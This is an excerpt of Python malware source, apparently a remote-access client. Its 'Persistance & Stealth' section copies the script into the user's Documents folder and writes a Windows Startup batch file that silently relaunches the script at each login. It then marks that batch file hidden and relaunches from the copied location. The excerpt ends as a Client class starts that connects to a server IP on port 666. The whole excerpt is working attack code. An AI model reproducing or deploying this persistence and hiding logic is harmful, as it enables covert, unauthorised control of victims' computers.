...
#--------------------------
# Persistance Started & Stealth Check
#--------------------------
import os
import shutil
...
# Copy the current script to the user's Documents folder
documents_path = os.path.expanduser("~/Documents")
if not os.path.exists(documents_path):
    os.makedirs(documents_path)
copied_path = os.path.join(documents_path, "python.py")

if not os.path.exists(copied_path):
    shutil.copy(current_path, copied_path)

# Create a batch file in the startup folder to run the copied script
    # Create the startup.bat file
startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
bat_path = os.path.join(startup_path, "startup.bat")

if not os.path.exists(bat_path):
    with open(bat_path, "w") as bat:
        bat.write("start /B pythonw.exe -s {}".format(copied_path))

    # Make the batch file hidden
    ctypes.windll.kernel32.SetFileAttributesW(ctypes.create_unicode_buffer(bat_path), 2)

# Check if the current script is in the correct directory
if os.path.abspath(current_path) != os.path.abspath(copied_path):
    print("Current script is not in the correct directory, attempting to open startup.bat...")

    # Try to open the startup.bat file
    startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "startup.bat")
    if os.path.exists(startup_path):
        os.system(f'"{os.path.abspath(startup_path)}"')

    # Exit the current script
    print("Exiting script...")
    exit()

print("Python script copied and startup.bat created. Script will run at startup.")
#--------------------------
# Persistance & Stealth Over
#--------------------------
...
class Client():
	def __init__(self, addr:Tuple[str,int]=((server_ip),666)) -> None:
